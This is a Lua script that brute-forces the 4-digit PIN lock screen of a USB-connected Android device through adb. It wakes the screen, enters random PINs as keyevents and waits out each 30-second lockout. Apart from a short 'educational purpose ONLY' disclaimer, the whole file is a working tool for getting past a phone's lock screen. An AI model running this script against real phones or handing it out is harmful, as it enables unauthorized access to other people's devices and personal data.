#!/usr/bin/env lua

dofile("functions.lua")

math.randomseed(os.time())

local adb_path = nil
local disclamer = "This program were created for educational purpose ONLY\n" ..
                  "                       The developer is not responsible for any crime commited"

msg("Initialization...")

msg("Checking adb...")

-- Check adb
adb_path = find_adb()

if not adb_path then
    msg("Adb executable do not exist in PATH")
    return 1
end

msg("Found adb at \27[1;33m" .. adb_path .. "\27[0m", "OK")
msg("Checking privileges...")

local username = os.getenv("USER")
local uid = pread("id -u " .. username)

if not uid then return 1 end

uid = tonumber(uid)

if uid ~= 0 then
    msg("Not enough privileges", "ERROR")
    return 1
end


msg("Current user: \27[1;33m" .. username .. "\27[0m (uid \27[1;33m" .. tostring(uid) .. "\27[0m)", "OK")
msg("Checking connected devices...")


local devices = pread("adb devices", true)

if not devices then return 1 end

local device = getline(devices, 1):gsub("device", ""):gsub("^%s*(.-)%s*$", "%1") or nil


if not device or device == "" then
    msg("No devices connected", "ERROR")
    return 1
end

msg("Found connected device \27[1;33m" .. device .. "\27[0m", "OK")
msg("Tests passed, initialization complete", "OK")

msg(disclamer, "WARNING")

sleep(1)
msg("Unlocking device...")

os.execute("adb shell input keyevent 82")
sleep(0.05)
os.execute("adb shell input swipe 407 1211 378 85")

msg("Device unlocked", "OK")


local combination = ""
local attempts = 1
local max_retries = 5

local digits = {}


for retries = 0, 9999 do
    retries = retries + 1

    for _ = 1, 4 do
        digits[_] = math.random(0, 9)
        combination = combination .. digits[_]
        digits[_] = digits[_] + 7
    end

    msg("Attempt \27[1;33m" .. attempts .. "\27[0m Retries \27[1;33m" .. retries .. "\27[0m: Trying combination: \27[1;33m" .. combination .. "\27[0m")

    if attempts == 3 then
        msg("Exceeded limit of attempts, from now you will have only one attempt to enter PIN and then 30 seconds cooldown will be activated", "WARNING")
        max_retries = 1
    end

    for _ = 1, 4 do
        os.execute("adb shell input keyevent " .. digits[_])
        sleep(0.02)
    end

    sleep(0.02)
    os.execute("adb shell input keyevent 66")

    if retries % max_retries == 0 then
        attempts = attempts + 1

        msg("Exceeded limit of \27[1;33m" .. max_retries .."\27[0m retries. Waiting \27[1;33m30\27[0m seconds...", "WARNING")

        sleep(0.05)
        os.execute("adb shell input keyevent 66")

        sleep(30)

        os.execute("adb shell input keyevent 82")
        os.execute("adb shell input swipe 407 1211 378 85")
    end

    combination = ""
end